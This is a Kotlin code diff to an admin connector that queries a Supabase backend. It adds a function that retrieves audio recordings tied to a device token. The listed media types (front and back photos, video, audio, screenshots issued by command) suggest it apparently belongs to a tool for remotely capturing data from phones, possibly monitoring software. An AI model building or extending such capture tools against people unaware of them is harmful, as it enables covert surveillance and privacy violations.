@@ -482,13 +482,13 @@ class SupabaseAdminConnector {
             val mediaTypes = when(filterType) {
                 "camera_photo" -> listOf("take_photo", "take_photo_front", "take_photo_back")
                 "video_record" -> listOf("record_video", "record_video_front", "record_video_back")
-                "audio_record" -> listOf("record_audio", "capture_audio")
+                "audio_record" -> listOf("record_audio", "capture_audio", "audio")
                 "screenshot" -> listOf("take_screenshot", "screenshot")
                 else -> listOf(filterType)
             }
             val typesFilter = mediaTypes.joinToString(",")
             val request = Request.Builder()
-                .url("$rootUrl/rest/v1/media_files?device_token=eq.$deviceToken&file_type=in.($typesFilter)&order=created_at.desc")
+                .url("$rootUrl/rest/v1/media_files?token=eq.$deviceToken&file_type=in.($typesFilter)&order=created_at.desc")
                 .addSupabaseHeaders()
                 .get()
                 .build()
@@ -931,5 +931,43 @@ class SupabaseAdminConnector {
         } catch (e: Exception) {
             "غير معروفة"
         }
+    }
+
+    suspend fun getMediaAudioFiles(deviceToken: String): List<MediaFile> = withContext(Dispatchers.IO) {
+        val list = mutableListOf<MediaFile>()
+        val request = Request.Builder()
+            .url("$rootUrl/rest/v1/media_files?token=eq.$deviceToken&file_type=eq.audio&order=created_at.desc")
+            .addSupabaseHeaders()
+            .get()
+            .build()
+        try {
+            client.newCall(request).execute().use { response ->
+                val bodyStr = response.body?.string() ?: return@withContext emptyList()
+                if (response.isSuccessful && bodyStr.startsWith("[")) {
+                    val arr = JSONArray(bodyStr)
+                    for (i in 0 until arr.length()) {
+                        val obj = arr.optJSONObject(i) ?: continue
+                        val id = obj.optLong("id")
+                        val token = obj.optString("token")
+                        val fileUrl = obj.optString("file_url")
+                        val fileType = obj.optString("file_type")
+                        val commandSource = obj.optString("command_source")
+                        val createdAt = obj.optString("created_at")
+                        
+                        list.add(MediaFile(
+                            id = id,
+                            token = token,
+                            file_url = fileUrl,
+                            file_type = fileType,
+                            command_source = commandSource,
+                            created_at = createdAt
+                        ))
+                    }
+                }
+            }
+        } catch (e: Exception) {
+            android.util.Log.e("SupabaseConnector", "Error fetching audio media files", e)
+        }
+        return@withContext list
     }
 }
